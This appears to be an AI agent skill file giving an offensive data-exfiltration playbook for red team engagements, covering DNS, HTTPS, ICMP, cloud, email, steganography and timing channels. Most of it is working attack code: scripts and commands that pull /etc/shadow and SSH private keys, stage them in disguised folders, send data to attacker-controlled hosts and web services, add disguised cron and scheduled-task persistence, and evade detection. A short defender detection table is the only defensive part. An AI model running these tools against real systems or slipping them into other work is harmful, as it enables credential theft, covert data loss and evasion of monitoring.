---
name: offensive-data-exfiltration
description: "Dense methodology covering DNS exfiltration (dnscat2, iodine, dns2tcp), HTTPS tunneling (domain fronting, CDN abuse, legitimate service channels), ICMP tunneling (icmpsh, ptunnel-ng), cloud storage dead drops (S3 presigned URLs, Azure Blob SAS tokens, GCS signed URLs), email-based exfil (SMTP, EWS, draft method), steganography (image, audio, document metadata), encoding/encryption (base64 chunking, XOR, AES), covert channels (custom protocol tunneling, HTTP header encoding, timing channels), and data staging (compression, splitting, encryption). Tools: dnscat2, iodine, dns2tcp, PacketWhisper, chisel, stunnel, icmpsh, ptunnel-ng, steghide, zsteg, OpenStego. MITRE ATT&CK: T1048 (Exfiltration Over Alternative Protocol), T1041 (Exfiltration Over C2 Channel), T1567 (Exfiltration Over Web Service), T1029 (Scheduled Transfer), T1030 (Data Transfer Size Limits), T1132 (Data Encoding), T1001 (Data Obfuscation). Use when planning or executing data exfiltration during authorized red team engagements or post-exploitation."
---

# Data Exfiltration -- Offensive Methodology

## Quick Workflow

1. **Inventory target data.** Map files, databases, credentials. Assess volume and classification.
2. **Stage.** Copy to a controlled directory. Strip unnecessary metadata and deduplicate.
3. **Compress and split.** Tar/zip, then chunk for your channel (DNS < 253 bytes/label; HTTPS tolerates MB).
4. **Encrypt.** AES-256-GCM or ChaCha20 every chunk. Never exfiltrate plaintext.
5. **Select channel.** DNS (port 53 only), HTTPS (web allowed), ICMP (ping allowed), cloud (SaaS access).
6. **Transmit.** Slow-drip for stealth; burst when you have a short window. Match baseline traffic rates.
7. **Verify receipt.** Recompute SHA-256 on the receiving end and compare against source manifest.
8. **Clean up.** Securely delete staging, temp files, dropped tools, and any scheduled tasks.

---

## DNS Exfiltration

MITRE: T1048.003 -- Exfiltration Over Alternative Protocol: DNS

### dnscat2

```bash
# Server -- set NS record for exfil.yourdomain.com -> your_server_ip first
ruby dnscat2.rb exfil.yourdomain.com --secret=YourSharedSecret

# Client on target
./dnscat --dns=domain:exfil.yourdomain.com --secret=YourSharedSecret

# Server console -- file transfer
session -i 1
download /etc/shadow /tmp/loot/shadow
```

```bash
# Force CNAME queries to avoid TXT-based detection
./dnscat --dns="domain=exfil.yourdomain.com,type=CNAME" --secret=YourSharedSecret
```

### iodine Tunneling

```bash
# Server (authoritative NS)
iodined -f -c -P ExfilPassword 10.0.0.1 tunnel.yourdomain.com

# Client -- creates dns0 interface at 10.0.0.2
iodine -f -P ExfilPassword tunnel.yourdomain.com
scp /tmp/staged.tar.enc attacker@10.0.0.1:/loot/
```

### dns2tcp

```bash
# Server (/etc/dns2tcpd.conf): domain = exfil.yourdomain.com, resources = ssh:127.0.0.1:22
dns2tcpd -f /etc/dns2tcpd.conf

# Client -- tunnel SSH over DNS
dns2tcpc -r ssh -z exfil.yourdomain.com -l 2222 -d 1
ssh -p 2222 attacker@127.0.0.1
```

### TXT/CNAME Record Encoding

```python
import base64, dns.resolver

def dns_exfil(data, domain, chunk_size=60):
    encoded = base64.b32encode(data).decode()
    for seq, i in enumerate(range(0, len(encoded), chunk_size)):
        query = f"{seq}.{encoded[i:i+chunk_size]}.data.{domain}"
        try: dns.resolver.resolve(query, "TXT")
        except Exception: pass  # data is in the query itself
```

### Slow-Drip DNS

```python
import random, time, base64, dns.resolver

def slow_drip_exfil(data, domain, min_delay=30, max_delay=120):
    encoded = base64.b32encode(data).decode()
    for seq, i in enumerate(range(0, len(encoded), 60)):
        query = f"{seq}.{encoded[i:i+60]}.d.{domain}"
        try: dns.resolver.resolve(query, "A")
        except Exception: pass
        time.sleep(random.uniform(min_delay, max_delay))
```

PacketWhisper exfiltrates via DNS without owning a server -- encodes data as queries captured from a PCAP: `python3 packetwhisper.py --mode transmit --file loot.enc --cipher_num 1`.

---

## HTTPS Tunneling

MITRE: T1041 -- Exfiltration Over C2 Channel; T1071.001 -- Web Protocols

### stunnel

Server wraps a port 8080 listener in TLS on 443. Client: `stunnel -c -d 127.0.0.1:9090 -r attacker.com:443`, then `cat /tmp/staged.tar.enc | ncat 127.0.0.1 9090`.

### Domain Fronting via CDN

```bash
# Outer SNI = legitimate-site.azureedge.net; inner Host = your collection server
curl -s -H "Host: your-collection.azureedge.net" \
    --data-binary @/tmp/staged.tar.enc https://legitimate-site.azureedge.net/upload

# chisel full tunnel behind CDN
chisel server --port 443 --reverse --auth user:pass  # server side
chisel client --header "Host: your-collection.azureedge.net" \
    https://legitimate-cdn-domain.com R:socks         # client side
```

### Legitimate Service Abuse

```bash
# Slack webhook
curl -X POST -H 'Content-type: application/json' \
    --data "{\"text\":\"$(base64 /tmp/chunk_001.enc)\"}" \
    https://hooks.slack.com/services/T00/B00/XXX
```

```python
# GitHub Gist -- private gist per chunk
import requests, base64
def gist_exfil(data, token):
    requests.post("https://api.github.com/gists",
        json={"public": False, "files": {"d.txt": {"content": base64.b64encode(data).decode()}}},
        headers={"Authorization": f"token {token}"})
```

```powershell
# Pastebin API from Windows
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\staged\data.enc"))
Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body @{
    api_dev_key="KEY"; api_option="paste"; api_paste_code=$data; api_paste_private="2"}
```

---

## ICMP Tunneling

MITRE: T1048.003 -- Non-Application Layer Protocol

### icmpsh

```bash
# Attacker
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py attacker_ip target_ip
```

Target (Windows): `icmpsh.exe -t attacker_ip -d 500 -b 30 -s 128`

### ptunnel-ng

```bash
ptunnel-ng -r0.0.0.0 -R22                              # server (attacker)
ptunnel-ng -p attacker_ip -l 2222 -r 127.0.0.1 -R 22   # client (target)
scp -P 2222 /tmp/staged.tar.enc attacker@127.0.0.1:/loot/
```

### Raw ICMP Embedding

```python
import struct, socket

def icmp_exfil(data, dest_ip, chunk_size=48):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    for seq, i in enumerate(range(0, len(data), chunk_size)):
        chunk = data[i:i+chunk_size]
        hdr = struct.pack("!BBHHH", 8, 0, 0, 0x1337, seq)
        pkt = hdr + chunk
        s = sum(struct.unpack("!%dH" % (len(pkt)//2), pkt[:len(pkt)&~1]))
        if len(pkt) % 2: s += pkt[-1] << 8
        s = (s >> 16) + (s & 0xFFFF); s += s >> 16
        hdr = struct.pack("!BBHHH", 8, 0, ~s & 0xFFFF, 0x1337, seq)
        sock.sendto(hdr + chunk, (dest_ip, 0))
    sock.close()
```

Keep payloads under 64 bytes to match standard ping. Larger payloads increase throughput but trigger IDS.

---

## Cloud Storage Dead Drops

MITRE: T1567.002 -- Exfiltration to Cloud Storage

### S3 Presigned URLs

```python
import boto3
def s3_upload_url(bucket, key, expiry=3600):
    return boto3.client("s3").generate_presigned_url(
        "put_object", Params={"Bucket": bucket, "Key": key}, ExpiresIn=expiry)
```

```bash
curl -X PUT -T /tmp/staged.tar.enc "https://bucket.s3.amazonaws.com/drop/d.enc?X-Amz-Algorithm=..."
```

### Azure Blob SAS Tokens

```powershell
$ctx = New-AzStorageContext -StorageAccountName "exfilacct" -StorageAccountKey "..."
$sas = New-AzStorageBlobSASToken -Container "drops" -Blob "d.enc" -Permission w `
    -ExpiryTime (Get-Date).AddHours(2) -Context $ctx
Invoke-RestMethod -Uri "https://exfilacct.blob.core.windows.net/drops/d.enc$sas" `
    -Method PUT -Headers @{"x-ms-blob-type"="BlockBlob"} -InFile "C:\staged\data.enc"
```

### GCS Signed URLs

```python
from google.cloud import storage
import datetime
def gcs_upload_url(bucket_name, blob_name, minutes=60):
    blob = storage.Client().bucket(bucket_name).blob(blob_name)
    return blob.generate_signed_url(version="v4", method="PUT",
        expiration=datetime.timedelta(minutes=minutes), content_type="application/octet-stream")
```

Presigned URLs need no credentials on the target. Rotate buckets between drops.

---

## Email-Based Exfiltration

MITRE: T1048.002 -- Asymmetric Encrypted Non-C2 Protocol

### SMTP

```python
import smtplib
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

def smtp_exfil(filepath, server, from_addr, to_addr, password):
    msg = MIMEMultipart(); msg["From"]=from_addr; msg["To"]=to_addr; msg["Subject"]="Q3 Report"
    with open(filepath, "rb") as f:
        part = MIMEBase("application", "octet-stream"); part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename=report.xlsx")
    msg.attach(part)
    with smtplib.SMTP_SSL(server, 465) as s: s.login(from_addr, password); s.send_message(msg)
```

### Exchange Web Services

```python
from exchangelib import Credentials, Account, FileAttachment, Message
def ews_exfil(filepath, email, password, recipient):
    account = Account(email, credentials=Credentials(email, password), autodiscover=True)
    with open(filepath, "rb") as f:
        att = FileAttachment(name="data.xlsx", content=f.read())
    m = Message(account=account, subject="Updated Spreadsheet", to_recipients=[recipient])
    m.attach(att); m.send()
```

### Draft Method

Store data in drafts -- no email transits the network, no sent-mail evidence:

```python
from exchangelib import Account, Credentials, Message
def draft_exfil(data_b64, email, password):
    account = Account(email, credentials=Credentials(email, password), autodiscover=True)
    Message(account=account, subject="", body=data_b64, is_draft=True).save(account.drafts)
```

---

## Steganography

MITRE: T1001.002 -- Data Obfuscation: Steganography

### Image

```bash
steghide embed -cf carrier.jpg -ef secret.enc -p "Pass" -f    # JPEG/BMP
steghide extract -sf carrier.jpg -p "Pass" -xf out.enc
zsteg carrier.png                                              # PNG analysis
openstego embed -mf secret.enc -cf cover.png -sf stego.png -p "Pass"
```

```python
from PIL import Image
import struct

def lsb_embed(cover_path, data, output_path):
    img = Image.open(cover_path); pixels = list(img.getdata())
    payload = struct.pack(">I", len(data)) + data
    bits = []
    for byte in payload:
        for i in range(7, -1, -1): bits.append((byte >> i) & 1)
    if len(bits) > len(pixels) * 3: raise ValueError("Payload too large")
    idx = 0; new_pixels = []
    for px in pixels:
        np = list(px)
        for c in range(min(3, len(np))):
            if idx < len(bits): np[c] = (np[c] & 0xFE) | bits[idx]; idx += 1
        new_pixels.append(tuple(np))
    out = Image.new(img.mode, img.size); out.putdata(new_pixels); out.save(output_path)
```

### Audio

```python
import wave, struct

def wav_lsb_embed(cover_wav, data, output_wav):
    with wave.open(cover_wav, "rb") as w:
        params = w.getparams(); frames = bytearray(w.readframes(w.getnframes()))
    payload = struct.pack(">I", len(data)) + data
    bits = []
    for byte in payload:
        for i in range(7, -1, -1): bits.append((byte >> i) & 1)
    for i, bit in enumerate(bits): frames[i] = (frames[i] & 0xFE) | bit
    with wave.open(output_wav, "wb") as w: w.setparams(params); w.writeframes(bytes(frames))
```

### Document Metadata

```bash
exiftool -Comment="$(base64 secret.enc)" carrier.jpg          # EXIF embed
cat carrier.jpg secret.enc > output.jpg                        # append after FFD9
```

```python
from PyPDF2 import PdfReader, PdfWriter
def pdf_metadata_exfil(pdf_path, data_b64, output_path):
    reader = PdfReader(pdf_path); writer = PdfWriter()
    for page in reader.pages: writer.add_page(page)
    chunks = [data_b64[i:i+1000] for i in range(0, len(data_b64), 1000)]
    writer.add_metadata({f"/Custom{i:04d}": c for i, c in enumerate(chunks)})
    with open(output_path, "wb") as f: writer.write(f)
```

---

## Encoding and Encryption

### Base64 / Hex / Base32 Chunking

```bash
base64 -w0 staged.tar.gz | fold -w 60 > /tmp/chunks.txt      # base64 chunks
xxd -p staged.enc > staged.hex                                 # hex for DNS labels
python3 -c "import base64; print(base64.b32encode(open('staged.enc','rb').read()).decode())"
```

### XOR

```python
def xor_encrypt(data, key):
    kb = key.encode() if isinstance(key, str) else key
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))
```

### AES-256-GCM

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib

def aes_encrypt_file(infile, outfile, password):
    salt = get_random_bytes(16)
    key = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100000)
    cipher = AES.new(key, AES.MODE_GCM)
    with open(infile, "rb") as f: pt = f.read()
    ct, tag = cipher.encrypt_and_digest(pt)
    with open(outfile, "wb") as f: f.write(salt + cipher.nonce + tag + ct)

def aes_decrypt_file(infile, outfile, password):
    with open(infile, "rb") as f: d = f.read()
    key = hashlib.pbkdf2_hmac("sha256", password.encode(), d[:16], 100000)
    pt = AES.new(key, AES.MODE_GCM, nonce=d[16:32]).decrypt_and_verify(d[48:], d[32:48])
    with open(outfile, "wb") as f: f.write(pt)
```

```bash
openssl enc -aes-256-cbc -salt -pbkdf2 -in data.tar.gz -out data.enc -pass pass:Key
```

---

## Covert Channels

### HTTP Header Encoding

```python
import base64, urllib.request

def http_header_exfil(data, url, chunk_size=256):
    encoded = base64.b64encode(data).decode()
    for seq, i in enumerate(range(0, len(encoded), chunk_size)):
        req = urllib.request.Request(url)
        req.add_header("X-Request-ID", f"{seq:06d}")
        req.add_header("X-Correlation-Token", encoded[i:i+chunk_size])
        try: urllib.request.urlopen(req)
        except Exception: pass
```

### chisel SOCKS Tunnel

```bash
chisel server --port 8443 --reverse --tls-key server.key --tls-cert server.crt
chisel client --header "User-Agent: Mozilla/5.0" https://server:8443 R:9050:socks
curl --socks5 127.0.0.1:9050 -X PUT -T /tmp/staged.enc http://collector/upload
```

### IP ID Field Encoding

```python
from scapy.all import IP, TCP, send
def ip_id_exfil(data, dest_ip, port=80):
    for i, byte in enumerate(data):
        send(IP(dst=dest_ip, id=byte)/TCP(dport=port, sport=12345+i, flags="S"), verbose=False)
```

### Timing Channels

```python
import time, socket

def timing_exfil(data, dest_ip, dest_port, bit_time=0.1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((dest_ip, dest_port))
    for byte in data:
        for i in range(7, -1, -1):
            bit = (byte >> i) & 1
            time.sleep(bit_time * 2 if bit else bit_time)
            sock.send(b"\x00")
    sock.close()
```

Timing channels: bits/second throughput, nearly undetectable. Use for keys and passwords only.

---

## Data Staging

MITRE: T1074.001 -- Local Data Staging; T1029 -- Scheduled Transfer; T1030 -- Data Transfer Size Limits

### Linux Pipeline

```bash
mkdir -p /tmp/.cache/updates
cp /etc/shadow /home/*/.ssh/id_rsa /tmp/.cache/updates/ 2>/dev/null
tar czf /tmp/.cache/updates/pkg.tar.gz -C /tmp/.cache/updates .
openssl enc -aes-256-cbc -salt -pbkdf2 -in /tmp/.cache/updates/pkg.tar.gz \
    -out /tmp/.cache/updates/pkg.enc -pass pass:EngagementKey
split -b 65536 /tmp/.cache/updates/pkg.enc /tmp/.cache/updates/chunk_
sha256sum /tmp/.cache/updates/chunk_* > /tmp/.cache/updates/manifest.sha256
```

### Windows Pipeline

```powershell
$s = "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\V01"
New-Item -ItemType Directory -Force -Path $s | Out-Null
Copy-Item "C:\Users\*\Documents\*.docx","C:\Users\*\.ssh\*" $s -Force 2>$null
Compress-Archive -Path "$s\*" -DestinationPath "$s\update.zip" -Force
# Encrypt with .NET AES, prepend IV to ciphertext, split into 64KB chunks
```

### Scheduled Transfers

```bash
# Cron -- one chunk every 30 min during business hours
(crontab -l 2>/dev/null; echo "*/30 8-17 * * 1-5 /tmp/.cache/exfil.sh") | crontab -
```

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -File C:\staged\exfil.ps1"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 30)
Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger
```

---

## Detection / Defender View

| Technique | Detection Signal | Defender Tool |
|-----------|-----------------|---------------|
| DNS exfil | High query volume, long labels, high entropy, unusual record types | Passive DNS, Zeek dns.log, entropy scoring |
| HTTPS tunnel | Persistent TLS, beaconing, JA3 mismatch, SNI/Host mismatch | TLS inspection, JA3 fingerprinting, NetFlow |
| ICMP tunnel | Large payloads, high ICMP volume, non-standard payload data | IDS payload rules, Zeek conn.log |
| Cloud dead drops | PUT to unfamiliar cloud endpoints from internal hosts | CASB, proxy logs, cloud API monitoring |
| Email exfil | Large/encrypted attachments, unusual recipients, draft volume | DLP gateway, Exchange audit logs |
| Steganography | Entropy anomalies, appended data after markers, stego signatures | StegExpose, file carving |
| Covert channels | Anomalous headers, irregular timing, non-standard protocol | DPI, protocol anomaly, ML traffic analysis |

### Evasion Notes

- Match DNS query rate to baseline; prefer A/AAAA over TXT/NULL records.
- Use browser-matching JA3 fingerprints; curl's TLS signature is distinctive.
- Keep ICMP payloads under 64 bytes. Rotate cloud buckets. Transfer during peak hours.

---

## Engagement Cheatsheet

| Scenario | Channel | Tool | Notes |
|----------|---------|------|-------|
| Only port 53 | DNS tunnel | iodine, dnscat2 | Slow; slow-drip for stealth |
| DNS, no infra | DNS query encoding | PacketWhisper | No auth NS needed |
| Web access | HTTPS | chisel, curl | Fastest; blend with traffic |
| Domain filtering | Domain fronting | curl + CDN | CDN must allow fronting |
| Ping allowed | ICMP | ptunnel-ng, icmpsh | Limited BW; keys/creds |
| Cloud access | Dead drop | S3/Azure/GCS URLs | No client tools needed |
| Email available | SMTP/EWS/draft | smtplib, exchangelib | Draft = no sent evidence |
| Content inspection | Stego + HTTPS | steghide + curl | Carrier must look normal |
| Extreme monitoring | Timing channel | Custom Python | Bits/sec; near-undetectable |
| Single file < 1MB | DNS TXT | Custom script | No tools to drop |
| Large dataset > 1GB | HTTPS or cloud | chisel, presigned URL | Daily chunks |

### Pre-Exfil Checklist

- Verify exfil is in scope per RoE
- Identify egress channels; stage in innocuous directory
- Compress, encrypt (AES-256 min), split into channel-sized chunks
- Generate SHA-256 manifest; test with canary file first
- Set rate below detection thresholds; verify receipt and integrity
- Securely delete staging and tools; document exfil chain for report

---

## Key References

- MITRE ATT&CK Exfiltration (TA0010): https://attack.mitre.org/tactics/TA0010/
- T1048, T1041, T1567, T1029, T1030, T1132, T1001
- dnscat2: https://github.com/iagox86/dnscat2
- iodine: https://github.com/yarrick/iodine
- dns2tcp: https://github.com/alex-sector/dns2tcp
- chisel: https://github.com/jpillora/chisel
- ptunnel-ng: https://github.com/lnslbrty/ptunnel-ng
- icmpsh: https://github.com/bdamele/icmpsh
- steghide: https://steghide.sourceforge.net/
- PacketWhisper: https://github.com/TryCatchHCF/PacketWhisper
- OpenStego: https://www.openstego.com/
- zsteg: https://github.com/zed-0xff/zsteg
